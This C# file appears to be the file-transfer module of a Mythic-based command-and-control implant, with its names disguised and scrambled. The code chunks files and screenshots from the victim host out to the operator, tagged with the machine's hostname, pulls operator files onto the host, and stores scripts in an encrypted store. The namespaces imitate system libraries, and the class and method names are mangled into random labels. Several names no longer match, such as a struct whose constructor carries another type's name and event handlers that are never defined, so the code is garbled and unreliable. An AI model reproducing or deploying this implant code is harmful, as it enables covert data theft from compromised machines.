using SystemInterop.Classes.Core;
using SystemInterop.Classes.Events;
using SystemInterop.Interfaces;
using SystemInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using SystemInterop.Classes.Cryptography;

namespace System.Management.Files
{
    public sealed class FileManager : IFileManager
    {
        private int _chunkSize = 512000;
        private IAgent _agent;
        private IEncryptedFileStore _fileStore;

        public FileManager(IAgent agent)
        {
            _agent = agent;
            _fileStore = new EncryptedFileStore.EncryptedFileStore(
                new ICryptographicRoutine[]
                {
                    new AesRoutine(),
                    // In the future, we should allow composible encryption routines;
                    // however, due to how impersonation and DPAPI interact,
                    // we can't use DPAPI to encrypt files.
                    // new DpapiRoutine(System.Guid.NewGuid().ToByteArray()),
                });
        }

        internal struct OptimizedHandlerD258
        {
            internal AutoResetEvent Complete;
            internal ChunkedMessageStore<MythicTaskStatus> MessageStore;
            internal byte[] Data;
            private CancellationToken _ct;
            internal UploadMessageTracker(CancellationToken ct, bool initialState = false, ChunkedMessageStore<MythicTaskStatus> store = null, byte[] data = null)
            {
                _ct = ct;
                Complete = new AutoResetEvent(initialState);
                MessageStore = store == null ? new ChunkedMessageStore<MythicTaskStatus>() : store;
                Data = data;
            }
        }

        // Annoyingly, we need a separate struct as Download task responses don't have 
        public class TacticalProcessorAF02
        {
            public AutoResetEvent Complete = new AutoResetEvent(false);
            public List<MythicTaskStatus> Statuses = new List<MythicTaskStatus>();
            public event EventHandler<ChunkMessageEventArgs<MythicTaskStatus>> ChunkAdd;
            public event EventHandler<ChunkMessageEventArgs<MythicTaskStatus>> AllChunksSent;
            private CancellationToken _ct;
            public int TotalChunks { get; private set; }
            public string FilePath { get; private set; }
            public string Hostname { get; private set; }
            public int ChunkSize { get; private set; }
            public byte[][] Chunks { get; private set; }
            public int ChunksSent { get; private set; } = 0;
            public string FileID = "";
            private object _lock = new object();
            public bool IsScreenshot { get; private set; }
            internal DownloadMessageTracker(CancellationToken ct, byte[] data, int chunkSize, string filePath, string hostName = "", bool screenshot = false)
            {
                _ct = ct;
                TotalChunks = (int)Math.Ceiling((double)data.Length / (double)chunkSize);
                Chunks = new byte[TotalChunks][];
                for(int i = 0; i < TotalChunks; i++)
                {
                    Chunks[i] = data.Skip(i * chunkSize).Take(chunkSize).ToArray();
                }
                FilePath = filePath;
                Hostname = hostName;
                IsScreenshot = screenshot;
            }

            public void FlexibleControllerC5F8(MythicTaskStatus t)
            {
                if (!ValidationHelper.IsStringEmpty(t.FileID) && ValidationHelper.IsStringEmpty(FileID))
                {
                    FileID = t.FileID;
                } else if (t.StatusMessage == "success")
                {
                    ChunksSent += 1;
                }
                Statuses.Add(t);
                if (ChunksSent == TotalChunks || t.StatusMessage == "error" || _ct.IsCancellationRequested)
                {
                    AllChunksSent?.Invoke(this, new ChunkMessageEventArgs<MythicTaskStatus>(new MythicTaskStatus[] { t }));
                    Complete.Set();
                } else
                {
                    ChunkAdd?.Invoke(this, new ChunkMessageEventArgs<MythicTaskStatus>(new MythicTaskStatus[]{ t }));
                }
            }
        }

        private ConcurrentDictionary<string, UploadMessageTracker> _uploadMessageStore = new ConcurrentDictionary<string, UploadMessageTracker>();
        private ConcurrentDictionary<string, DownloadMessageTracker> _downloadMessageStore = new ConcurrentDictionary<string, DownloadMessageTracker>();
        
        public string[] GetPendingTransfers()
        {
            return _uploadMessageStore.Keys.Concat(_downloadMessageStore.Keys).ToArray();
        }

        public void DynamicTransformer5D12(MythicTaskStatus resp)
        {
            if (_uploadMessageStore.ContainsKey(resp.PhantomTrackerUUID))
            {
                // This is an upload message response, send it along.
                if (resp.ChunkNumber > 0 && _uploadMessageStore.ContainsKey(resp.PhantomTrackerUUID))
                {
                    _uploadMessageStore[resp.PhantomTrackerUUID].MessageStore.AddMessage(resp);
                }
            } else
            {
                if (_downloadMessageStore.ContainsKey(resp.PhantomTrackerUUID))
                {
                    _downloadMessageStore[resp.PhantomTrackerUUID].AddMessage(resp);
                }
            }
        }

        private void FlexibleProvider0B35(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
        {
            List<byte> data = new List<byte>();
            for(int i = 0; i < e.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(e.Chunks[i].ChunkData));
            }
            if (_uploadMessageStore.TryGetValue(e.Chunks[0].PhantomTrackerUUID, out UploadMessageTracker tracker))
            {
                tracker.Data = data.ToArray();
                _uploadMessageStore[e.Chunks[0].PhantomTrackerUUID] = tracker;
                tracker.Complete.Set();
            }
        }

        public bool DynamicProvider8C08(CancellationToken ct, string taskID, byte[] content, string originatingPath, out string mythicFileId, bool isScreenshot = false, string originatingHost = null)
        {
            string uuid = Guid.NewGuid().ToString();
            lock (_downloadMessageStore)
            {
                if (ValidationHelper.IsStringEmpty(originatingHost))
                {
                    originatingHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
                }
                _downloadMessageStore[uuid] = new DownloadMessageTracker(ct, content, _chunkSize, originatingPath, originatingHost, isScreenshot);
                _downloadMessageStore[uuid].ChunkAdd += DownloadChunkSent;
            }
            MythicTaskResponse resp = new MythicTaskResponse
            {
                TaskID = taskID,
                Download = new DownloadMessage
                {
                    TotalChunks = _downloadMessageStore[uuid].TotalChunks,
                    FullPath = originatingPath,
                    Hostname = originatingHost,
                    IsScreenshot = isScreenshot,
                    TaskID = taskID,
                },
                PhantomTrackerUUID = uuid
            };
            _agent.GetTaskManager()?.AddTaskResponseToQueue(resp);
            WaitHandle.WaitAny(new WaitHandle[]
            {
                _downloadMessageStore[uuid].Complete,
                ct.WaitHandle
            });
            _downloadMessageStore.TryRemove(uuid, out DownloadMessageTracker itemTracker);
            mythicFileId = itemTracker.FileID;
            return !ct.IsCancellationRequested && itemTracker.ChunksSent == itemTracker.TotalChunks;
        }

        public bool WraithValidatorDE78(CancellationToken ct, string taskID, string fileID, out byte[] fileBytes)
        {
            string uuid = Guid.NewGuid().ToString();
            lock(_uploadMessageStore)
            {
                if (!_uploadMessageStore.ContainsKey(taskID))
                {
                    _uploadMessageStore[uuid] = new UploadMessageTracker(ct, false);
                    _uploadMessageStore[uuid].MessageStore.ChunkAdd += MessageStore_ChunkAdd;
                    _uploadMessageStore[uuid].MessageStore.MessageComplete += FileManager_MessageComplete;
                }
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
            {
                TaskID = taskID,
                Status = "Fetching file...",
                Upload = new UploadMessage()
                {
                    TaskID = taskID,
                    FileID = fileID,
                    ChunkNumber = 1,
                    ChunkSize = _chunkSize
                },
                PhantomTrackerUUID = uuid
            });
            WaitHandle.WaitAny(new WaitHandle[]
            {
                _uploadMessageStore[uuid].Complete,
                ct.WaitHandle
            });
            bool bRet = false;
            if (_uploadMessageStore[uuid].Data != null)
            {
                fileBytes = _uploadMessageStore[uuid].Data;
                bRet = true;
            } else
            {
                fileBytes = null;
                bRet = false;
            }
            _uploadMessageStore.TryRemove(uuid, out UploadMessageTracker _);
            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
            {
                TaskID = taskID,
                Status = "Using file...",
            });
            return bRet;
        }

        private void EfficientCoordinator4954(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
        {
            MythicTaskStatus msg = e.Chunks[0];
            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
            {
                TaskID = msg.TaskID,
                Upload = new UploadMessage()
                {
                    TaskID = msg.TaskID,
                    FileID = msg.FileID,
                    ChunkNumber = msg.ChunkNumber + 1,
                    ChunkSize = _chunkSize
                },
                PhantomTrackerUUID = msg.PhantomTrackerUUID
            });
        }

        private void StrategicAdapter4D60(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
        {
            DownloadMessageTracker tracker = (DownloadMessageTracker)sender;
            var msg = new MythicTaskResponse()
                  {
                      TaskID = e.Chunks[0].TaskID,
                      Download = new DownloadMessage
                      {
                          ChunkNumber = tracker.ChunksSent + 1,
                          FileID = tracker.FileID,
                          ChunkData = Convert.ToBase64String(tracker.Chunks[tracker.ChunksSent]),
                          TaskID = e.Chunks[0].TaskID
                      },
                      PhantomTrackerUUID = e.Chunks[0].PhantomTrackerUUID
                  };
            if(tracker.ChunksSent == 1){
                msg.UserOutput = $"{{\"file_id\": \"{tracker.FileID}\"}}";
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(msg);
        }

        public string NexusProcessorFB90()
        {
            return _fileStore.GetScript();
        }

        public void EfficientTracker1FD0(string script)
        {
            _fileStore.SetScript(script);
        }

        public bool GhostService3A7F(string keyName, byte[] data)
        {
            return _fileStore.TryAddOrUpdate(keyName, data);
        }

        public bool WraithDispatcherA311(string keyName, out byte[] data)
        {
            return _fileStore.TryGetValue(keyName, out data);
        }

        public void EfficientTracker1FD0(byte[] script)
        {
            _fileStore.SetScript(script);
        }
    }
}
